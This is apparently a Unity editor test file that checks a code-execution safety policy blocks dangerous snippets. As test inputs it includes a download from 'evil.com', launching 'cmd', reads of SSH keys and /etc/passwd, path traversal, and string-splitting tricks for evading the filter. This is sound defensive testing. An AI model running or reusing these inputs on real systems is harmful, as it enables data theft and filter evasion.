// Copyright (C) KitWright. Licensed under MIT.

using System;
using System.IO;
using System.Reflection;
using KitWright.Editor.Tools.Builtins;
using KitWright.Editor.Tools.Helpers;
using KitWright.Editor.Tools.Scripting;
using NUnit.Framework;
using UnityEngine;

namespace KitWright.Editor.Tests
{
    public sealed class ExecuteCodeSafetyPolicyTests
    {
        [Test]
        public void BaseSafety_BlocksExistingDangerousPatterns()
        {
            AssertBlocked("File.Delete(\"Assets/test.txt\");", false, "File.Delete");
            AssertBlocked("while (true) { }", false, "while");
        }

        [Test]
        public void StrictSafety_BlocksBroadFilesystemWritesAndPaths()
        {
            AssertBlocked("File.WriteAllText(\"Assets/test.txt\", \"x\");", true, "File write");
            AssertBlocked("Directory.CreateDirectory(\"Assets/generated\");", true, "Directory write");
            AssertBlocked("var path = \"/Users/xyz/.ssh/config\";", true, "Absolute");
            AssertBlocked("var path = \"../ProjectSettings/ProjectSettings.asset\";", true, "Path traversal");
            AssertBlocked("var path = @\"C:\\Users\\Public\\test.txt\";", true, "Absolute");
        }

        [Test]
        public void NonStrictSafety_DoesNotApplyStrictFilesystemRules()
        {
            AssertAllowed("File.WriteAllText(\"Assets/test.txt\", \"x\");", false);
            AssertAllowed("var path = \"/Users/xyz/.ssh/config\";", false);
        }

        [Test]
        public void ToolResultFormatter_DetectsStructuredErrorResponses()
        {
            var error = ToolResultFormatter.Error("TEST_ERROR");

            Assert.IsTrue(ToolResultFormatter.IsError(error));
            Assert.IsFalse(ToolResultFormatter.IsError("Error: legacy"));
            Assert.IsFalse(ToolResultFormatter.IsError("{\"success\":true,\"message\":\"ok\"}"));
        }

        [Test]
        public void BuildCodeForCompilation_ProjectNamespaceInjectionDisabled_DoesNotInjectProjectNamespaces()
        {
            var fullCode = ScriptExecutionFunctions.BuildCodeForCompilation(
                "public class Smoke { public static string Run() { return \"ok\"; } }",
                "TempScript",
                false,
                out var actualClassName);

            Assert.AreEqual("Smoke", actualClassName);
            Assert.IsFalse(fullCode.Contains("using KitWright.Editor.Tools.Builtins;"), fullCode);
            Assert.IsFalse(fullCode.Contains("using KitWright.Editor.Tests;"), fullCode);
        }

        [Test]
        public void BuildCodeForCompilation_IKitWrightCommandMissingUsing_AddsScriptingNamespace()
        {
            var fullCode = ScriptExecutionFunctions.BuildCodeForCompilation(
                "public class CommandScript : IKitWrightCommand { public void Execute(ExecutionContext ctx) { ctx.ReturnValue = \"ok\"; } }",
                "TempScript",
                false,
                out var actualClassName);

            Assert.AreEqual("CommandScript", actualClassName);
            StringAssert.StartsWith("using KitWright.Editor.Tools.Scripting;", fullCode);
        }

        [Test]
        public void BuildCodeForCompilation_IKitWrightCommandExistingUsing_DoesNotDuplicateScriptingNamespace()
        {
            var fullCode = ScriptExecutionFunctions.BuildCodeForCompilation(
                "using KitWright.Editor.Tools.Scripting;\npublic class CommandScript : IKitWrightCommand { public void Execute(ExecutionContext ctx) { ctx.ReturnValue = \"ok\"; } }",
                "TempScript",
                false,
                out _);

            var first = fullCode.IndexOf("using KitWright.Editor.Tools.Scripting;", StringComparison.Ordinal);
            Assert.GreaterOrEqual(first, 0, fullCode);
            Assert.AreEqual(first, fullCode.LastIndexOf("using KitWright.Editor.Tools.Scripting;", StringComparison.Ordinal), fullCode);
        }

        [Test]
        public void ReachableProjectNamespaceUsings_AreDerivedFromLoadedScriptAssemblies()
        {
            var projectRoot = Path.GetFullPath(Path.Combine(Application.dataPath, ".."));
            var usings = ScriptExecutionFunctions.GetReachableProjectNamespaceUsings(
                new[] { typeof(string).Assembly, typeof(ScriptExecutionFunctions).Assembly },
                projectRoot);

            StringAssert.Contains("using KitWright.Editor.Tools.Builtins;", usings);
            Assert.IsFalse(usings.Contains("using System;"), usings);
            Assert.IsFalse(usings.Contains("KitWright.Repro.Unreachable"), usings);
        }

        [Test]
        public void ProjectScriptAssemblyPath_OnlyAllowsLibraryScriptAssembliesUnderProject()
        {
            var projectRoot = Path.Combine(Path.GetTempPath(), "KitWright Project");

            Assert.IsTrue(ScriptExecutionFunctions.IsProjectScriptAssemblyPath(
                Path.Combine(projectRoot, "Library", "ScriptAssemblies", "Game.Editor.dll"),
                projectRoot));
            Assert.IsFalse(ScriptExecutionFunctions.IsProjectScriptAssemblyPath(
                Path.Combine(projectRoot, "Library", "PackageCache", "com.example", "Example.dll"),
                projectRoot));
            Assert.IsFalse(ScriptExecutionFunctions.IsProjectScriptAssemblyPath(
                Path.Combine(projectRoot, "Packages", "com.example", "Example.dll"),
                projectRoot));
            Assert.IsFalse(ScriptExecutionFunctions.IsProjectScriptAssemblyPath(
                Path.Combine(projectRoot + "Other", "Library", "ScriptAssemblies", "Game.Editor.dll"),
                projectRoot));
        }

        [Test]
        public void ExecuteCodeDiagnostics_UnwrapsTargetInvocationException()
        {
            var inner = new InvalidOperationException("real compiler failure");
            var wrapped = new TargetInvocationException(
                "Exception has been thrown by the target of an invocation.",
                new TargetInvocationException(inner));

            Assert.AreSame(inner, ScriptExecutionFunctions.UnwrapTargetInvocationException(wrapped));
        }

        [Test]
        public void CommandOutcome_NoLoggedErrors_ReportsPlainSuccess()
        {
            var ctx = new ExecutionContext();
            ctx.Log("did a thing");
            ctx.LogWarning("careful");

            var message = ScriptExecutionFunctions.DescribeCommandOutcome(
                ctx.Logs, out var errorCount, out var firstError);

            Assert.AreEqual("Command executed.", message);
            Assert.AreEqual(0, errorCount);
            Assert.IsNull(firstError);
        }

        [Test]
        public void CommandOutcome_LoggedErrors_NamesCountAndFirstErrorInMessage()
        {
            var ctx = new ExecutionContext();
            ctx.LogError("first boom");
            ctx.LogWarning("careful");
            ctx.LogError("second boom");

            var message = ScriptExecutionFunctions.DescribeCommandOutcome(
                ctx.Logs, out var errorCount, out var firstError);

            Assert.AreEqual(2, errorCount);
            Assert.AreEqual("first boom", firstError);
            StringAssert.StartsWith("[2 logged errors]", message);
            StringAssert.Contains("first boom", message);
        }

        // ------------------------------------------------------------------
        //  Per-rule BaseRules tests — each rule individually covered
        // ------------------------------------------------------------------

        [TestCase("File.Delete(\"Assets/test.txt\");", "File.Delete")]
        [TestCase("Directory.Delete(\"Assets/folder\");", "Directory.Delete")]
        [TestCase("System.IO.File.Delete(\"Assets/test.txt\");", "File.Delete")]
        [TestCase("Process.Start(\"cmd\");", "Process.Start")]
        [TestCase("System.Diagnostics.Process.Start(\"cmd\");", "Process.Start")]
        [TestCase("System.Diagnostics.Process.GetProcesses();", "System.Diagnostics.Process")]
        [TestCase("Environment.Exit(0);", "Environment.Exit")]
        [TestCase("Application.Quit();", "Application.Quit")]
        [TestCase("AssetDatabase.DeleteAsset(\"Assets/test.prefab\");", "AssetDatabase.DeleteAsset")]
        [TestCase("while (true) { DoSomething(); }", "while")]
        [TestCase("while(true){}", "while")]
        [TestCase("for (;;) { DoSomething(); }", "for")]
        [TestCase("for(;;){}", "for")]
        [TestCase("Assembly.Load(\"MyAssembly\");", "Assembly.Load")]
        [TestCase("Assembly.LoadFrom(\"path/to/dll\");", "Assembly.LoadFrom")]
        [TestCase("Assembly.LoadFile(\"/path/to/dll\");", "Assembly.LoadFile")]
        [TestCase("new WebClient().DownloadString(\"http://evil.com\");", "WebClient")]
        [TestCase("var c = new HttpClient();", "HttpClient")]
        [TestCase("MethodInfo mi = null; mi.Invoke(null, null);", "Reflection method Invoke")]
        [TestCase("typeof(Foo).GetMethod(\"Bar\");", "GetMethod")]
        [TestCase("Type.GetType(\"System.IO.File\");", "Type.GetType")]
        [TestCase("t.InvokeMember(\"Run\", flags, null, null, null);", "InvokeMember")]
        [TestCase("Convert.FromBase64String(\"dGVzdA==\");", "Base64")]
        public void BaseRule_BlocksDangerousPattern(string code, string expectedReasonPart)
        {
            AssertBlocked(code, false, expectedReasonPart);
        }

        // ------------------------------------------------------------------
        //  Per-rule StrictRules tests — each strict rule individually covered
        // ------------------------------------------------------------------

        [TestCase("File.WriteAllText(\"Assets/x.txt\", \"data\");", "File write")]
        [TestCase("File.WriteAllBytes(\"Assets/x.bin\", bytes);", "File write")]
        [TestCase("File.WriteAllLines(\"Assets/x.txt\", lines);", "File write")]
        [TestCase("File.AppendAllText(\"Assets/log.txt\", \"line\");", "File write")]
        [TestCase("File.AppendAllLines(\"Assets/log.txt\", lines);", "File write")]
        [TestCase("File.Copy(\"a\", \"b\");", "File write")]
        [TestCase("File.Create(\"Assets/x.txt\");", "File write")]
        [TestCase("File.CreateText(\"Assets/x.txt\");", "File write")]
        [TestCase("File.OpenWrite(\"Assets/x.txt\");", "File write")]
        [TestCase("File.Move(\"a\", \"b\");", "File write")]
        [TestCase("File.Replace(\"a\", \"b\", \"c\");", "File write")]
        [TestCase("File.SetAttributes(\"a\", attr);", "File write")]
        [TestCase("File.SetCreationTime(\"a\", time);", "File write")]
        [TestCase("File.SetLastAccessTime(\"a\", time);", "File write")]
        [TestCase("File.SetLastWriteTime(\"a\", time);", "File write")]
        [TestCase("Directory.CreateDirectory(\"Assets/generated\");", "Directory write")]
        [TestCase("Directory.Delete(\"Assets/old\");", "Directory.Delete")]
        [TestCase("Directory.Move(\"a\", \"b\");", "Directory write")]
        public void StrictRule_BlocksFilesystemWriteOperation(string code, string expectedReasonPart)
        {
            AssertBlocked(code, true, expectedReasonPart);
        }

        [TestCase("FileInfo.CopyTo(\"dest\");", "FileInfo write")]
        [TestCase("FileInfo.Create();", "FileInfo write")]
        [TestCase("FileInfo.CreateText();", "FileInfo write")]
        [TestCase("FileInfo.Delete();", "FileInfo write")]
        [TestCase("FileInfo.MoveTo(\"dest\");", "FileInfo write")]
        [TestCase("FileInfo.Replace(\"dest\", \"backup\");", "FileInfo write")]
        [TestCase("DirectoryInfo.Create();", "DirectoryInfo write")]
        [TestCase("DirectoryInfo.CreateSubdirectory(\"sub\");", "DirectoryInfo write")]
        [TestCase("DirectoryInfo.Delete();", "DirectoryInfo write")]
        [TestCase("DirectoryInfo.MoveTo(\"dest\");", "DirectoryInfo write")]
        public void StrictRule_BlocksFileInfoAndDirectoryInfoOperations(string code, string expectedReasonPart)
        {
            AssertBlocked(code, true, expectedReasonPart);
        }

        [TestCase("new FileStream(\"Assets/x.bin\", FileMode.Create);", "FileStream")]
        [TestCase("var fs = new System.IO.FileStream(path, mode);", "FileStream")]
        [TestCase("new StreamWriter(\"Assets/x.txt\");", "StreamWriter")]
        [TestCase("var sw = new System.IO.StreamWriter(path);", "StreamWriter")]
        [TestCase("new StreamReader(\"Assets/x.txt\");", "StreamReader")]
        [TestCase("var sr = new System.IO.StreamReader(path);", "StreamReader")]
        public void StrictRule_BlocksRawStreamConstruction(string code, string expectedReasonPart)
        {
            AssertBlocked(code, true, expectedReasonPart);
        }

        [TestCase("var path = \"/Users/john/.ssh/id_rsa\";", "Absolute")]
        [TestCase("var path = \"/home/user/secret\";", "Absolute")]
        [TestCase("var path = \"/root/.bashrc\";", "Absolute")]
        [TestCase("var path = \"/System/Library/plist\";", "Absolute")]
        [TestCase("var path = \"/Library/something\";", "Absolute")]
        [TestCase("var path = \"/Applications/App.app\";", "Absolute")]
        [TestCase("var path = \"/bin/bash\";", "Absolute")]
        [TestCase("var path = \"/sbin/init\";", "Absolute")]
        [TestCase("var path = \"/usr/bin/env\";", "Absolute")]
        [TestCase("var path = \"/etc/passwd\";", "Absolute")]
        [TestCase("var path = \"/var/log/syslog\";", "Absolute")]
        [TestCase("var path = \"/private/tmp/x\";", "Absolute")]
        [TestCase("var path = \"/tmp/x\";", "Absolute")]
        [TestCase("var path = @\"C:\\Windows\\System32\\cmd.exe\";", "Absolute")]
        [TestCase("var path = @\"D:\\SomeFolder\\file.txt\";", "Absolute")]
        public void StrictRule_BlocksAbsoluteOrSystemPaths(string code, string expectedReasonPart)
        {
            AssertBlocked(code, true, expectedReasonPart);
        }

        [TestCase("var path = \"~/.ssh/config\";", "User home")]
        [TestCase("var path = \"%USERPROFILE%/Desktop\";", "User home")]
        [TestCase("var path = \"%APPDATA%/config\";", "User home")]
        [TestCase("var path = \"%LOCALAPPDATA%/data\";", "User home")]
        [TestCase("var path = \"$HOME/.bashrc\";", "User home")]
        public void StrictRule_BlocksUserHomeAndConfigPaths(string code, string expectedReasonPart)
        {
            AssertBlocked(code, true, expectedReasonPart);
        }

        [TestCase("var path = \"../ProjectSettings/ProjectSettings.asset\";", "Path traversal")]
        [TestCase("var path = \"Assets/../../etc/passwd\";", "Path traversal")]
        [TestCase("var path = @\"Assets\\..\\..\\secret\";", "Path traversal")]
        public void StrictRule_BlocksPathTraversal(string code, string expectedReasonPart)
        {
            AssertBlocked(code, true, expectedReasonPart);
        }

        // ------------------------------------------------------------------
        //  CollapseAdjacentStringLiterals bypass detection
        // ------------------------------------------------------------------

        [Test]
        public void CollapseAdjacentStrings_DetectsFileDeleteBypass()
        {
            AssertBlocked("var x = \"Fi\" + \"le.Delete\";", false, "File.Delete");
        }

        [Test]
        public void CollapseAdjacentStrings_DetectsProcessStartBypass()
        {
            AssertBlocked("var x = \"Proc\" + \"ess.Start\";", false, "Process.Start");
        }

        [Test]
        public void CollapseAdjacentStrings_DetectsMultiSegmentBypass()
        {
            AssertBlocked("var x = \"As\" + \"sembly\" + \".Load\";", false, "Assembly.Load");
        }

        [Test]
        public void CollapseAdjacentStrings_DetectsWebClientBypass()
        {
            AssertBlocked("var x = \"new We\" + \"bClient\";", false, "WebClient");
        }

        // ------------------------------------------------------------------
        //  Allowed cases — patterns that should NOT be blocked
        // ------------------------------------------------------------------

        [TestCase("File.ReadAllText(\"Assets/test.txt\");", false)]
        [TestCase("File.ReadAllLines(\"Assets/test.txt\");", false)]
        [TestCase("File.Exists(\"Assets/test.txt\");", false)]
        [TestCase("var file = \"test\";", false)]
        [TestCase("var process = someObject.Process;", false)]
        [TestCase("Debug.Log(\"Hello World\");", false)]
        [TestCase("var assembly = Assembly.GetExecutingAssembly();", false)]
        public void BaseRules_AllowsSafePatterns(string code, bool strict)
        {
            AssertAllowed(code, strict);
        }

        [TestCase("File.ReadAllText(\"Assets/test.txt\");", true)]
        [TestCase("File.ReadAllLines(\"Assets/test.txt\");", true)]
        [TestCase("File.Exists(\"Assets/test.txt\");", true)]
        [TestCase("var file = \"test\";", true)]
        [TestCase("Debug.Log(\"Hello World\");", true)]
        [TestCase("var path = \"Assets/Scripts/MyScript.cs\";", true)]
        public void StrictRules_AllowsSafePatterns(string code, bool strict)
        {
            AssertAllowed(code, strict);
        }

        // ------------------------------------------------------------------
        //  Non-strict mode does NOT apply strict rules
        // ------------------------------------------------------------------

        [TestCase("File.WriteAllText(\"Assets/x.txt\", \"data\");")]
        [TestCase("new FileStream(\"x\", FileMode.Create);")]
        [TestCase("new StreamWriter(\"x\");")]
        [TestCase("Directory.CreateDirectory(\"Assets/gen\");")]
        public void NonStrict_DoesNotBlockStrictOnlyPatterns(string code)
        {
            AssertAllowed(code, false);
        }

        private static void AssertBlocked(string code, bool strict, string expectedReasonPart)
        {
            Assert.IsTrue(ExecuteCodeSafetyPolicy.TryFindViolation(code, strict, out _, out var reason));
            StringAssert.Contains(expectedReasonPart, reason);
        }

        private static void AssertAllowed(string code, bool strict)
        {
            Assert.IsFalse(ExecuteCodeSafetyPolicy.TryFindViolation(code, strict, out _, out _));
        }
    }
}
